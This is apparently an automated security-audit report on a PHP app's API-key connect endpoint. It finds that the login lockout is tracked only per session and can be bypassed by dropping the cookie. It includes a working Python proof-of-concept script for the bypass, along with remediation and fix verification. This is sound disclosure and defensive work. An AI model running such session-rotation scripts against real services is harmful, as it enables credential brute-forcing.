# Brute-force rate limit on POST /api/connect.php bypassed by cookie rotation (per-session counter, no IP/global limiter)

**ID:** vuln-0001
**Severity:** MEDIUM
**Found:** 2026-10-18 21:16:26 UTC
**Target:** http://host.docker.internal:8080 (multi.ai.inbox landing app; source: /workspace/landing)
**Endpoint:** /api/connect.php
**CWE:** CWE-307
**CVSS:** 5.3
**Confidence:** High
**Fix Effort:** Low

## Description

The brute-force protection on the Namecheap API-key connect endpoint is enforced only per browser session. Failed connect attempts are tracked in the PHP session (`$_SESSION['nc_attempts']`) with a 5-attempts/10-minute lockout, but there is no IP-based or global limiter: an attacker who simply does not send the session cookie gets a fresh zero counter on every request and can guess Namecheap API keys through the server indefinitely.

## Evidence

Dynamic PoC (live target, httpx script): PART 1 with one cookie jar — attempts 1-5 → `HTTP 401 {"ok":false,"error":"Invalid Namecheap API response"}`, attempt 6 → `HTTP 429 {"ok":false,"error":"Too many failed attempts, wait 10 minutes and retry"}`. PART 2 with a fresh session per attempt — 8 consecutive attempts → every one `HTTP 401`, zero 429. Full raw results in the PoC JSON output: lockout sequence `[(1,401),(2,401),(3,401),(4,401),(5,401),(6,429)]`, bypass sequence `[(1,401),(2,401),(3,401),(4,401),(5,401),(6,401),(7,401),(8,401)]`. Static confirmation: `rg -n "fail|attempt|limit|throttl|rate|429|lockout" /workspace/landing` (excluding node_modules) matches only bootstrap.php:18-19 (defines), bootstrap.php:98-108 (session counter), connect.php:29/42 (call sites), disconnect.php:11 (session clear) — no REMOTE_ADDR-based or shared limiter anywhere.

## Impact

An unauthenticated attacker can use the publicly reachable landing server as an unthrottled proxy for Namecheap API-key guessing: every request without a session cookie returns 401 and resets nothing, so the 5-attempts/10-minute lockout never applies. In production (real `api.namecheap.com`), this enables sustained key-guessing campaigns through the server's IP, abuse of the server as a relay to evade Namecheap-side throttling, and service degradation of the landing app itself. The per-session counter provides no real protection against any automated client.

## Counterevidence

Actively checked for controls that would neutralize the finding: (1) nginx layer — `/workspace/landing/nginx/landing.conf` applies only body-size and security-header directives; no `limit_req`/`limit_conn` zones are configured for `/api/`, and PHP-FPM has no per-IP throttling; (2) application layer — `rg -i "fail|attempt|limit|throttl|rate|429|lockout"` across `/workspace/landing` (excluding node_modules) finds attempt tracking only in `bootstrap.php:98-108` and `connect.php:29/42`, all session-scoped, with no `REMOTE_ADDR`-based counter and no shared store; (3) session hardening does not mitigate — `bootstrap.php:5-17` makes the session cookie HttpOnly/SameSite=Lax, which does not prevent a scripted client from simply omitting it; (4) upstream dependency — no WAF, CDN, or reverse-proxy layer is part of this deployment that would throttle per-IP request volume before PHP. The one legitimate mitigation remaining is Namecheap's own whitelisting model (its API requires a whitelisted ClientIp), which constrains successful key compromise in some configurations but does not throttle the guessing channel itself. No constraint meaningfully limits the bypass.

## What Would Change This Severity

A production deployment of this app relaying to the real api.namecheap.com (instead of the internal nc-mock) would raise this to critical, because the landing server then functions as a confirmed unauthenticated unthrottled relay for real Namecheap API-key guessing. Conversely, demonstration that the live 8080 deployment is internal-only (not internet-reachable) would reduce severity to low.

## Technical Analysis

`php/bootstrap.php:98-108` — `register_failed_attempt()` stores attempt timestamps exclusively in the PHP session: it reads `$_SESSION['nc_attempts']`, drops timestamps older than `NC_ATTEMPT_WINDOW` (600s), appends the current time, and returns 429 when more than `NC_MAX_ATTEMPTS` (5) attempts remain. The counter lives and dies with the session: a request that carries no `MULTIAI_LANDING` session cookie gets a fresh session with no `nc_attempts` key, so the count is always zero and the lockout can never engage. `php/connect.php:29` calls `register_failed_attempt()` before `nc_call()` (the relay to `NAMECHEAP_API_URL`), and `php/connect.php:42` calls `clear_failed_attempts()` after a successful connect, so a found valid key immediately clears the counter. Because the threshold is per-session, an attacker rotating sessions (or never sending the cookie) bypasses the limiter entirely — verified dynamically. A `rg` sweep across `/workspace/landing/php` (bootstrap.php, connect.php, domains.php, dns.php, mcp.php, namecheap.php, status.php, disconnect.php) confirms no IP-based or global limiter exists anywhere in the application. A minimal repository-native fix extends `register_failed_attempt()` to track attempts per remote address in a file-based store under `CRED_DIR` (already a 0700 directory with an atomic tmp+rename precedent), checked before the session counter, with `clear_failed_attempts()` unlinking the entry on success.

## Proof of Concept

1. Obtain a session CSRF token: GET http://host.docker.internal:8080/api/status.php (first call sets the MULTIAI_LANDING session cookie, second returns the csrf token).
2. In-window lockout test (single cookie jar): POST /api/connect.php six times with `username=testuser1`, `api_key=INVALID<n>` (fails the key format check, so no upstream call is made), header `X-Landing-CSRF: <csrf>`, sending the session cookie each time. Attempts 1-5 return 401; attempt 6 returns 429 "Too many failed attempts, wait 10 minutes and retry" — the per-session lockout works.
3. Cookie-drop bypass test: repeat the same bad attempts, but use a completely fresh HTTP session (no cookie) for every single attempt — fetch a csrf token from status.php and POST connect.php once per session, 8 times, about 1 second apart. Every attempt returns 401; no attempt ever returns 429. The failed-attempt counter never accumulates because each new session starts at zero, so the limiter is fully bypassed by rotating/not sending the session cookie.
4. Total volume kept modest (≤ 20 connect attempts, ~1s apart) and no valid Namecheap key was used at any point — the PoC keys are format-invalid and rejected before any upstream request.

Part 1: one cookie jar, 6 bad connect attempts in-window -> expect 401s then a
429 lockout by the 6th attempt (NC_MAX_ATTEMPTS=5 per NC_ATTEMPT_WINDOW=600s).

Part 2: fresh session per attempt (no shared cookie), 8 bad attempts -> expect
every attempt to return 401 and never 429, because the limiter is per-session

Uses INVALID api_key formats so PHP validation rejects the request before any
Namecheap call is made (no upstream guessing traffic at all).

import json
import sys
import time

import httpx

BASE = "http://host.docker.internal:8080"
CSRF = "X-Landing-CSRF"


def summary(resp: httpx.Response) -> str:
    try:
        body = resp.json()
    except Exception:
        body = {"raw": resp.text[:120]}
    error = body.get("error", "")
    return f"HTTP {resp.status_code}  {error}"


def bootstrap_session(client: httpx.Client) -> str:
    r = client.get(f"{BASE}/api/status.php")
    r.raise_for_status()
    csrf = r.json()["csrf"]
    if not csrf:
        raise RuntimeError("status.php returned no csrf token")
    return csrf


def connect(client: httpx.Client, csrf: str, username: str, api_key: str) -> httpx.Response:
    return client.post(
        f"{BASE}/api/connect.php",
        headers={CSRF: csrf},
        data={"username": username, "api_key": api_key, "use_sandbox": "0"},
    )


def main() -> int:
    results = {"lockout": [], "bypass": []}

    print("=" * 70)
    print("PART 1: in-window lockout with ONE cookie jar (bad api_key format)")
    print("=" * 70)
    with httpx.Client(timeout=20.0) as client:
        csrf = bootstrap_session(client)
        print(f"session bootstrap: csrf={csrf[:8]}... (from status.php)")
        for i in range(1, 7):
            r = connect(client, csrf, "testuser1", f"INVALID{i}")
            line = f"  attempt {i}: {summary(r)}"
            results["lockout"].append({"attempt": i, "status": r.status_code, "error": r.json().get("error", "")})
            print(line)
            time.sleep(1.0)

    print()
    print("=" * 70)
    print("PART 2: cookie-drop bypass - FRESH session for EACH attempt")
    print("=" * 70)
    for i in range(1, 9):
        with httpx.Client(timeout=20.0) as fresh:
            csrf = bootstrap_session(fresh)
            r = connect(fresh, csrf, "testuser1", f"INVALID{i}")
            line = f"  attempt {i}: fresh session, {summary(r)}"
            results["bypass"].append({"attempt": i, "status": r.status_code, "error": r.json().get("error", "")})
            print(line)
            time.sleep(1.0)

    lockout_429 = [r for r in results["lockout"] if r["status"] == 429]
    bypass_429 = [r for r in results["bypass"] if r["status"] == 429]
    bypass_401 = [r for r in results["bypass"] if r["status"] == 401]
    print()
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"  part1: 429 lockout reached: {bool(lockout_429)} (attempts: {[r['attempt'] for r in lockout_429]})")
    print(f"  part2: total 429 seen: {len(bypass_429)} | total 401 seen: {len(bypass_401)} of {len(results['bypass'])}")
    verdict = bool(lockout_429) and len(bypass_429) == 0 and len(bypass_401) == len(results["bypass"])
    print(f"  VERDICT: lockout per-session confirmed AND cookie-drop bypass confirmed: {verdict}")
    with open("rl_poc_results.json", "w") as fh:
        json.dump(results, fh, indent=2)
    print("  raw results saved to rl_poc_results.json")
    return 0 if verdict else 1


if __name__ == "__main__":
    sys.exit(main())

## Remediation

Enforce the failed-attempt invariant outside the session: add an IP-based (or global) failed-attempt counter in `php/bootstrap.php` alongside the existing session counter, so that exceeding the threshold returns 429 regardless of cookie state. The narrowest repository-native change is to extend `register_failed_attempt()` to also record attempts per remote address in a file store under `CRED_DIR` (already a 0700 credential directory with an atomic tmp+rename write precedent in `store_credentials()`), checked before the session counter; `clear_failed_attempts()` should then remove the per-IP entry on successful connect so legitimate users who mistyped a key are not stranded. Complement (not replace) this with nginx `limit_req` on `location /api/` for defense in depth, and consider a small per-request delay or upstream-response cache for repeated identical guesses to blunt relay-abuse. Fix embedded in this report as a one-click suggestion block covering `register_failed_attempt()` and `clear_failed_attempts()`.

## Fix Verification

Applied the suggested patch to a throwaway copy of `php/bootstrap.php` (the live mount at /workspace/landing is read-only for this run, so the repo itself was not modified). Verification per gate: (1) Applicability — diff of copy vs repo shows only the two intended hunks (`register_failed_attempt()` lines 98-108, `clear_failed_attempts()` lines 110-113); `php -l` (PHP 8.4.24) reports "No syntax errors detected". (2) Security closure — local regression harness (landed CRED_DIR via LANDING_CRED_DIR): 8 successive `register_failed_attempt()` calls → attempts 1-5 pass, attempt 6 exits with 429 "Too many failed attempts"; a FRESH process then immediately gets 429, proving the counter persists across sessions and kills the cookie-drop bypass; remote address normalization falls back to a shared 'unknown' key when REMOTE_ADDR is absent (CLI) and uses the validated client IP under php-fpm. (3) Bypass review — checked sibling sink: connect.php calls register_failed_attempt() once (line 29) before nc_call(); the exceed check runs on every call before any upstream relay; encoding/verb variation is irrelevant because the counter keys on REMOTE_ADDR only; an attacker rotating source IPs defeats any per-IP limiter by design, which is why the suggestion keeps the session counter and adds the IP store — for true global throttling an operator-grade limiter (nginx limit_req/limit_conn, or a shared Redis store) is the recommended complement, noted in remediation prose. (4) Preserved behavior — clear_failed_attempts() still unsets the session key and additionally unlinks the per-IP file (verified: after clear, next attempt passes and counter json contains exactly 1 timestamp); legit 5-fail-then-connect flow resets fully. (5) Repository checks — `php -l` on the patched copy passed; the app's own test suite is not present in the mounted tree. Gap: the patch could not be applied to the real checkout or exercised through nginx+php-fpm in this environment (read-only mount, no docker); the regression was run against the patched copy with PHP CLI only.

## Assumptions

The bypassed limiter becomes materially important in production where `NAMECHEAP_API_URL` points at `api.namecheap.com`: the landing server then functions as an unthrottled relay for Namecheap API-key guessing. Exploitation requires no privileged position, no user interaction, and no prior compromise; a single internet-reachable HTTP client suffices. The deployment used for validation relays to an internal mock API (nc-mock:8088), which bounds the demonstrated upstream impact but not the structural flaw.
